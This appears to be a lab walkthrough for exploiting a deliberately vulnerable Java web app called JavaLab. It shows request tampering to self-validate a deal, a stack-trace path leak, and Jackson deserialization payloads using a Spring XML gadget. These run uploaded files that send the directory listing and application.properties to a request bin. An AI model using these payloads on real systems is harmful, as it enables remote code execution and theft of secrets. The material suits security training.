# JAVALAB EXPLOITATION

## PART 1 (AUTO VALIDATE A DEAL)

### Step 1

Post a deal and intercept the request

```HTTP
------WebKitFormBoundaryGTkAu8msA7WAW6bE
Content-Disposition: form-data; name="infos"; filename="blob"
Content-Type: application/json

{"description":"aa","link":"aa"}
------WebKitFormBoundaryGTkAu8msA7WAW6bE--
```

### Step 2

Change the JSON and add the field "validated" with the name of the file in Base64

```HTTP
------WebKitFormBoundaryGTkAu8msA7WAW6bE
Content-Disposition: form-data; name="infos"; filename="blob"
Content-Type: application/json

{"description":"aa","link":"aa","validated":"fileNameInBase64"}
------WebKitFormBoundaryGTkAu8msA7WAW6bE--
```

### Step 3

Send the request, and ...... TADAM!


## PART 2 (Get application.properties or RCE)

### SETP 0

Upload the same image **with the same name** twice to get a stack trace

```JAVA
java.nio.file.FileAlreadyExistsException: /opt/app/tmp/BD-Blagues-toto.jpg
	at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:94)
	at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:111)
	at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:116)
	at java.base/sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:219)
	at java.base/java.nio.file.spi.FileSystemProvider.newOutputStream(FileSystemProvider.java:478)
	at java.base/java.nio.file.Files.newOutputStream(Files.java:219)
	at java.base/java.nio.file.Files.copy(Files.java:3066)
```

Now, we know that every images are store in **/opt/app/tmp**

### STEP 1

1. Create a new deal and upload **"collect_arbo.jpg"**. This script (file) will send the arbo in /tmp/test.txt
2. To execute this file, use the Contact form, intercept the request and change **details** content

```JSON
{"email":"a","content":"a","details":{"@class":"com.laba4s.Private","phone":"a"}}
```

to "["org.springframework.context.support.FileSystemXmlApplicationContext","/opt/app/tmp/collect_arbo.jpg"]"

Final JSON:
```JSON
{"email":"a","content":"a","details":["org.springframework.context.support.FileSystemXmlApplicationContext","/opt/app/tmp/collect_arbo.jpg"]}
```

### STEP 2

1. Create a new deal and upload **"send_arbo_to_request_bin.jpg"**. This script (file) will send the arbo to your $request bin
2. To execute this file, use the Contact form, intercept the request and change **details** content

```JSON
{"email":"a","content":"a","details":{"@class":"com.laba4s.Private","phone":"a"}}
```

to "["org.springframework.context.support.FileSystemXmlApplicationContext","opt/app/tmp/send_arbo_to_request_bin.jpg"]" to execute the content of send_arbo_to_request_bin.jpg

Final JSON:
```JSON
{"email":"a","content":"a","details":["org.springframework.context.support.FileSystemXmlApplicationContext","/opt/app/tmp/send_arbo_to_request_bin.jpg"]}
```

### STEP 3

1. Create a new deal and upload **"send_config_file_to_request_bin.jpg"**. This file will send the application.properties to your $request bin
2. Use the Contact form, intercept the request and change **details** content

```JSON
{"email":"a","content":"a","details":{"@class":"com.laba4s.Private","phone":"a"}}
```

to "["org.springframework.context.support.FileSystemXmlApplicationContext","/opt/app/tmp/send_config_file_to_request_bin.jpg"]" to execute the content of send_arbo_to_request_bin.jpg

Final JSON:
```JSON
{"email":"a","content":"a","details":["org.springframework.context.support.FileSystemXmlApplicationContext","/opt/app/tmp/send_config_file_to_request_bin.jpg"]}
```
